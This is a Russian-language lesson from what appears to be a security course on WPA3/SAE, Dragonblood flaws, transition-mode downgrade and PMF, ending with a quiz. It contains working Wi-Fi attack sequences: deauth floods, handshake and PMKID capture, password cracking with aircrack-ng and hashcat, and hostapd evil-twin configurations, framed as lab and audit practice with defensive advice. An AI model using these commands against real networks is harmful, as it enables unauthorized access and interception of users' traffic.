---
id: network-wpa3
title: "WPA3 и SAE: Dragonblood, переходный режим и обходы"
category: network
parent: network-wireless-80211
difficulty: hard
order: 2
tags: [network, wireless, wpa3, sae, dragonblood, pmf]
prerequisites: [network-wireless-80211]
useful_for:
  - "CTF Network (wireless-задачи)"
  - "Пентест: аудит WPA3-сетей"
  - "Работа: оценка стойкости Wi-Fi"
estimated_minutes: 55
summary: "Как WPA3/SAE закрывает оффлайн-перебор, что такое уязвимости Dragonblood, и почему переходный режим снова открывает WPA2-атаки."
---
WPA3 должен был закрыть слабости WPA2 (в первую очередь — оффлайн-подбор пароля по 4-way handshake). Вместо этого он принёс новый набор атак — «Dragonblood» — и проблемы переходного режима. Этот урок — про SAE, Dragonblood, transition mode и практические обходы.

Разберём, чем SAE отличается от WPA2-PSK, какие атаки на него известны и что делать на пентесте.

## WPA2 и почему его «сломали»

В WPA2-PSK рукопожатие (4-way handshake) даёт паре злоумышленника материал (ANonce, SNonce, MIC, MAC), по которому **оффлайн** перебирается PSK. Отсюда — практика захвата handshake и подбор по словарю (aircrack-ng, hashcat). Плюс PMKID-атака позволяет получить материал без ожидания клиента.

WPA3 заменил PSK-рукопожатие на **SAE** (Simultaneous Authentication of Equals, на базе Dragonfly), что делает оффлайн-подбор неэффективным: каждая попытка пароля требует онлайн-взаимодействия.

## SAE (Dragonfly): как работает

SAE — это пароль-аутентифицированный обмен ключами (PAKE) на эллиптических кривых. Упрощённо:

1. Обе стороны выводят из пароля элемент группы (hash-to-curve).
2. Обмениваются «commit»-сообщениями (скаляр × элемент).
3. Обмениваются «confirm»-сообщениями и выводят общий ключ.
4. Активная атака требует участия в обмене — оффлайн-подбор невозможен.

Ключевые свойства: forward secrecy, устойчивость к оффлайн-подбору, но **сложность** и **новые классы атак**.

## Dragonblood: атаки на SAE

| Атака | Суть | Эффект |
|---|---|---|
| Side-channel (cache/timing) | утечка информации о пароле по времени/кэшу | сужение пространства подбора |
| Downgrade to WPA2 | принуждение к переходному режиму | захват WPA2-handshake |
| DoS (commit flood) | заваливание commit-сообщениями | отказ в обслуживании |
| Group downgrade | навязывание слабой группы | ослабление |
| Password partitioning | ускорение подбора по структуре пароля | практический подбор |

Ключевой практический вектор — **переходный режим (transition mode)**: сеть поддерживает и WPA2, и WPA3. Клиент может быть сбит на WPA2, где работает обычный оффлайн-подбор. Поэтому наличие «WPA3» на точке не гарантирует защиту.

## Transition mode и downgrade

Многие AP работают в режиме WPA2/WPA3 mixed, чтобы поддерживать старые устройства. Атакующий:

1. Создаёт rogue AP с тем же SSID, но только WPA2.
2. Ждёт, пока клиент подключится (или форсирует deauth от настоящей точки).
3. Захватывает WPA2 4-way handshake и подбирает PSK оффлайн.

```bash
# создать rogue AP в WPA2 (hostapd)
cat > hostapd.conf <<'CFG'
interface=wlan0
ssid=TargetNet
wpa=2
wpa_passphrase=anything
wpa_key_mgmt=WPA-PSK
CFG
hostapd hostapd.conf
```

## Инструменты

```bash
# перевод адаптера в monitor mode
airmon-ng start wlan0
# сканирование сетей
airodump-ng wlan0mon
# захват WPA2 handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon
# deauth для ускорения захвата
aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
# подбор PSK (WPA2)
aircrack-ng -w rockyou.txt cap-01.cap
hashcat -m 22000 cap.hc22000 wordlist.txt
# PMKID
hcxdumptool -o pmkid.pcapng -i wlan0mon
```

Для SAE-specific атак нужны специализированные PoC (например, инструменты из исследований Dragonblood) — на практике чаще эксплуатируют downgrade.

## Проверка и энумерация WPA3-сети

1. Определить, включён ли WPA3-only или transition mode (в `airodump-ng`/`iw` видно по RSN capabilities).
2. Если transition mode — искать возможность downgrade.
3. Проверить, не отключён ли **PMF (Protected Management Frames)**: без PMF работают deauth/disassoc, с PMF — нет.
4. Оценить сложность/структуру пароля (для password partitioning).

```bash
# детали RSN (SAE, PMF, группы)
iw dev wlan0 scan | grep -A20 'TargetNet'
```

## PMF и защита от deauth

WPA3 **обязательно** включает PMF (802.11w), что защищает управляющие кадры от подделки. Но в transition mode PMF может быть опциональным (PMF-capable, не required) — тогда deauth всё ещё работает для WPA2-клиентов. Проверяйте, required ли PMF.

## Разобранный пример: downgrade в переходном режиме

1. `airodump-ng` показывает сеть `CorpWiFi` с RSN, поддерживающим SAE и PSK (transition).
2. Проверяем PMF: `required` или нет.
3. Если PMF не required — поднимаем rogue AP `CorpWiFi` только WPA2-PSK.
4. Deauth клиентов от настоящей точки (PMF не защищает WPA2-клиентов в mixed-режиме).
5. Клиент подключается к rogue AP (или пытается), захватываем handshake.
6. Подбираем PSK оффлайн; успех означает, что «WPA3» на бумаге не помог.

## Частые ошибки

- Считать, что «WPA3 = защищено» — transition mode и Dragonblood меняют картину.
- Искать оффлайн-подбор SAE — он неэффективен, нужен онлайн или side-channel.
- Игнорировать PMF: без него deauth тривиален.
- Путать WPA3-Personal (SAE) и WPA3-Enterprise (802.1X + Suite-B) — это разные вещи.
- Забывать про WPA3-only vs mixed при аудите.

## Что дальше / решение

Методика: определить режим (WPA3-only / mixed), проверить PMF (required?), оценить возможность downgrade. На практике эксплуатируется именно downgrade переходного режима, а не криптоанализ SAE. Для защиты: WPA3-only, PMF required, сильные пароли (для устойчивости к partitioning), мониторинг rogue AP. WPA3 — шаг вперёд, но только при правильной конфигурации.

## Reference-таблица: WPA2 vs WPA3

| Аспект | WPA2-PSK | WPA3-Personal (SAE) |
|---|---|---|
| Рукопожатие | 4-way handshake | SAE (Dragonfly) |
| Оффлайн-подбор | возможен (handshake/PMKID) | неэффективен |
| Forward secrecy | нет | есть |
| PMF | опционально | обязательно |
| Основная атака | захват + подбор | downgrade, side-channel, DoS |
| PMKID-атака | работает | неприменима |

## Reference-таблица: индикаторы в сканировании

| Признак | Значение |
|---|---|
| RSN: SAE | WPA3-Personal |
| RSN: PSK + SAE | transition mode (риск downgrade) |
| RSN: 802.1X | WPA2/3-Enterprise |
| PMF capable | защита возможна, но не обязательна |
| PMF required | deauth/disassoc защищены |
| WPA3-only | нет WPA2-fallback |

## Чек-лист аудита Wi-Fi

1. Перевести адаптер в monitor mode, просканировать (`airodump-ng`).
2. Определить режим: WPA2 / WPA3 / mixed.
3. Проверить PMF: capable или required.
4. Для mixed — оценить возможность downgrade через rogue AP.
5. Для WPA2 — захватить handshake/PMKID, подобрать оффлайн.
6. Проверить наличие rogue AP и evil twin.
7. Задокументировать: режим, PMF, найденный PSK (если подобран), рекомендации.

## Разобранный пример: захват и подбор WPA2 handshake

Практика на WPA2-сети (в лаборатории).

Шаг 1. Monitor mode:

```bash
airmon-ng start wlan0
# wlan0mon создан
```

Шаг 2. Сканирование и выбор цели:

```bash
airodump-ng wlan0mon
# BSSID              CH  ENC   ESSID
# AA:BB:CC:DD:EE:FF   6  WPA2  LabNet
```

Шаг 3. Захват на канале цели:

```bash
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w lab wlan0mon
```

Шаг 4. Deauth, чтобы клиент переподключился и отдал handshake:

```bash
aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
# в окне airodump появится: WPA handshake: AA:BB:CC:DD:EE:FF
```

Шаг 5. Подбор:

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt lab-01.cap
# KEY FOUND! [ labpassword123 ]
```

Альтернатива без ожидания клиента — PMKID:

```bash
hcxdumptool -o pmkid.pcapng -i wlan0mon
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng
hashcat -m 22000 pmkid.hc22000 rockyou.txt
```

Вывод: WPA2 с коротким словарным паролем ломается минутами. Для WPA3 тот же сценарий не работает — но downgrade переходного режима возвращает нас к этому же подбору.

## Разобранный пример: rogue AP с тем же SSID

```bash
# конфиг hostapd: тот же SSID, WPA2
cat > rogue.conf <<'CFG'
interface=wlan1
driver=nl80211
ssid=LabNet
hw_mode=g
channel=6
wpa=2
wpa_passphrase=attackpass
wpa_key_mgmt=WPA-PSK
CFG
hostapd rogue.conf
```

Пока клиент думает, что подключён к «своей» сети, весь его трафик идёт через вас (evil twin). Детали — в уроке про evil twin и captive portal. Для защиты: WPA3-only, PMF required, мониторинг rogue AP по аномалиям BSSID.

## SAE по шагам: commit/confirm и hash-to-element

SAE — это Dragonfly PAKE, адаптированный в 802.11. Обмен состоит из двух фаз:

1. **Commit**: каждая сторона посылает скаляр и элемент группы, выведенные из пароля и случайных значений. Атакующий, перехватив commit, **не может** проверить пароль оффлайн — потому что для проверки ему нужен ответ другой стороны, а тот зависит от её секрета.
2. **Confirm**: обе стороны посылают подтверждение, доказывающее знание пароля. Только после этого выводятся PMK/сессионные ключи.

Ключевая деталь — **hunting-and-pecking**: старая реализация перебирала счётчик `counter` до тех пор, пока результат не окажется валидной точкой кривой. Это делало время вычисления зависимым от пароля — отсюда timing-утечка Dragonblood. Современная реализация (hash-to-element / SSWU) вычисляет точку за **постоянное** время, что и закрыло side-channel.

```text
Commit:   (scalar_1, element_1)  <--->  (scalar_2, element_2)
Confirm:  hash(...)               <--->  hash(...)
Derive:   PMK = f(пароль, обмен)  -> 4-way handshake (как в WPA2)
```

Важно понимать: **сам 4-way handshake в WPA3 остался**. SAE лишь заменяет PSK-вывод PMK на интерактивный PAKE. Поэтому после успешного SAE-обмена идёт обычный 4-way, но оффлайн-перебор уже невозможен — нет фиксированного PMK из словаря.

## Dragonblood (CVE-2019-9494 … 9499): разбор по классам

Dragonblood — это набор из нескольких независимых уязвимостей ранних реализаций SAE, а не одна CVE:

| Класс | Суть | Условие | Митигация |
|---|---|---|---|
| Timing side-channel | время commit зависит от пароля (hunting-and-pecking) | удалённый наблюдатель | hash-to-element (постоянное время) |
| Cache-based side-channel | кэш-тайминги выдают число итераций | локально/по времени | константное время |
| Group downgrade | атакующий навязывает слабую группу | отсутствие проверки группы | фиксировать группу/ECC |
| Denial of Service | поток commit-кадров перегружает AP | AP без anti-clogging | anti-clogging token, rate-limit |
| Weak password (online) | онлайн-подбор при слабом пароле | rate-limit отсутствует | длинный пароль, лимит попыток |

Timing-атака позволяла **сузить пространство пароля** (не восстановить его целиком оффлайн, но резко ускорить онлайн-подбор), а group downgrade — заставить использовать группу с известными слабостями. Практический вывод: **обновляйте прошивки AP и клиентов**; старые WPA3-устройства (2019–2020) уязвимы.

## PMF (802.11w): почему без него WPA3 бессилен

**Protected Management Frames** — обязательная часть WPA3, но её надо проверить отдельно. PMF аутентифицирует управляющие кадры (deauth, disassoc, action), не давая атакующему:

- подделать **deauth/disassoc** и сбить клиента;
- форсировать **downgrade** в transition mode;
- запустить **evil twin** без разрыва легитимного соединения.

```bash
# Проверить, требует ли AP PMF (столбец RSN Capabilities / MFP)
sudo iw dev wlan0 scan | grep -A20 'SSID' | grep -Ei 'RSN|MFP|PMF'
# Wireshark: в beacon смотрим поле RSN -> Management Frame Protection
#   "MFPR"=required, "MFPC"=capable, отсутствие = не поддерживается
```

Если PMF выключен (или `MFPC` без `MFPR`), deauth-атака снова работает — и transition mode открывает путь к WPA2-downgrade. В **WPA3-only** сети без transition PMF обязателен, и deauth не проходит.

## Переходный режим: как определить и чем он опасен

Transition mode анонсирует в одном beacon и WPA2-PSK, и WPA3-SAE (один SSID, два RSN-набора). Атакующий:

1. Находит сеть в режиме `WPA2/WPA3` (airodump-ng, столбец ENC/AUTH).
2. Поднимает **evil twin** с тем же SSID, но только WPA2-PSK.
3. Сбивает клиента deauth (если PMF не enforced) — клиент выбирает «совместимый» WPA2.
4. Ловит 4-way handshake → **оффлайн-перебор PSK** как в WPA2.

```bash
# 1. Определить режим сети
sudo airodump-ng wlan0mon            # ENC: WPA2 WPA3  -> transition mode
# 2. Захватить материал
sudo hcxdumptool -i wlan0mon --enable_status=1 -o dump.pcapng
# 3. Сконвертировать и перебрать (WPA2-путь)
hcxpcapngtool -o dump.hc22000 dump.pcapng
hashcat -m 22000 dump.hc22000 /usr/share/wordlists/rockyou.txt
```

Это **главная практическая дыра WPA3**: наличие WPA2 в переходном режиме сводит на нет всю защиту SAE. Лечится только отключением WPA2 (WPA3-only) там, где все клиенты это поддерживают.

## WPA3-Enterprise и 192-bit mode

- **WPA3-Enterprise** использует 802.1X/EAP (обычно EAP-TLS) и требует **проверки сертификата сервера**. Без неё клиент попадёт на evil twin с поддельным сервером — и это самая частая реальная ошибка.
- **192-bit mode** (Suite-B) ужесточает алгоритмы: GCMP-256, HMAC-SHA-384, ECDHE/ECDSA на P-384.
- **EAP-TTLS/PAP** может передавать пароль открыто внутри туннеля — при слабом внешнем слое или без проверки cert это компромисс.

```bash
# Профиль клиента wpa_supplicant для EAP-TLS с обязательной проверкой
#   phase1="tls_disable_tlsv1_0=1 tls_disable_tlsv1_1=1"
#   ca_cert="/etc/ssl/ca.pem"        <- без ca_cert клиент доверится любому
#   domain_match="radius.corp.local" <- привязка к имени сервера
```

## Инструменты: что реально работает с WPA3

```bash
# Сканирование и мониторинг
sudo airodump-ng wlan0mon                      # режим/каналы/клиенты
sudo iw dev wlan0 scan | grep -Ei 'RSN|WPA3|SAE|MFP'
# Захват WPA2-материала в transition (PMKID/4-way)
sudo hcxdumptool -i wlan0mon -o dump.pcapng --enable_status=1
hcxpcapngtool -o out.hc22000 dump.pcapng       # конвертация
hashcat -m 22000 out.hc22000 wordlist.txt      # перебор PSK (WPA2-путь)
# SAE-исследование: Wireshark отображает SAE commit/confirm как
#   "Authentication (SAE Commit)" / "(SAE Confirm)"
# Dragonblood PoC: исследовательские скрипты (не для продакшена)
```

| Инструмент | Назначение | WPA3-специфика |
|---|---|---|
| airodump-ng | скан/мониторинг | показывает WPA3/transition |
| hcxdumptool | захват PMKID/4-way | WPA2-материал из transition |
| hcxpcapngtool | конвертация дампов | готовит для hashcat -m 22000 |
| hashcat | перебор PSK | только WPA2-путь |
| Wireshark | разбор SAE | commit/confirm, RSN-поля |
| wpa_supplicant | клиент | проверка cert, PMF |

## Практический чек-лист аудита WPA3-сети

1. Определить режим: **WPA3-only** или **transition** (`airodump-ng`, `iw scan`).
2. Проверить **PMF**: `MFPR` (required) или только `MFPC` (capable).
3. Если transition — попробовать downgrade через evil twin WPA2 (в лаборатории).
4. Оценить длину/сложность пароля (SAE не спасает от онлайн-подбора).
5. Для Enterprise — проверить, требует ли клиент валидный сертификат сервера.
6. Проверить версию прошивки AP/клиентов на Dragonblood.
7. Для гостевого доступа — включён ли **OWE** и не путают ли его с обычным open.
8. Зафиксировать вывод: WPA3-only + PMF + длинный пароль = стойко; transition = дыра.

## Квиз

```quiz
- question: "Почему WPA3-SAe устойчив к оффлайн-перебору пароля?"
  options:
    - "Пароль не используется"
    - "SAE — интерактивный PAKE, материал handshake не проверяется оффлайн по словарю"
    - "Он использует WEP"
    - "Он отключает handshake"
  answer: 1
  explanation: "Проверка пароля в SAE возможна только в интерактивном обмене, что исключает оффлайн-словарь."
- question: "Что такое transition mode и почему он опасен?"
  options:
    - "Режим энергосбережения"
    - "AP принимает и WPA2, и WPA3; атакующий может сбить клиента на WPA2 через evil twin"
    - "Режим только WPA3"
    - "Режим мониторинга"
  answer: 1
  explanation: "Поддержка WPA2 в переходном режиме открывает downgrade-атаку."
- question: "Какая функция критична для защиты от downgrade через deauth?"
  options:
    - "PMF (802.11w)"
    - "DHCP snooping"
    - "NAT"
    - "STP"
  answer: 0
  explanation: "Protected Management Frames не даёт подделать deauth-кадры."
- question: "К классу каких уязвимостей относятся проблемы ранних реализаций SAE?"
  options:
    - "Dragonblood"
    - "Heartbleed"
    - "POODLE"
    - "BEAST"
  answer: 0
  explanation: "Dragonblood — набор уязвимостей SAE: side-channel, downgrade группы, DoS."
- question: "Какое свойство даёт SAE помимо устойчивости к оффлайн-перебору?"
  options:
    - "Forward secrecy"
    - "Отключение шифрования"
    - "Поддержку WEP"
    - "Отсутствие пароля"
  answer: 0
  explanation: "SAE обеспечивает forward secrecy: прошлые сессии не раскрываются при утечке пароля."
```

## Где пригодится

- **CTF:** wireless-задачи с WPA3/transition.
- **Пентест:** аудит стойкости Wi-Fi.
- **Работа:** оценка и настройка WPA3.
- **Red team:** downgrade через transition mode.
- **Обучение:** понимание эволюции Wi-Fi-безопасности.
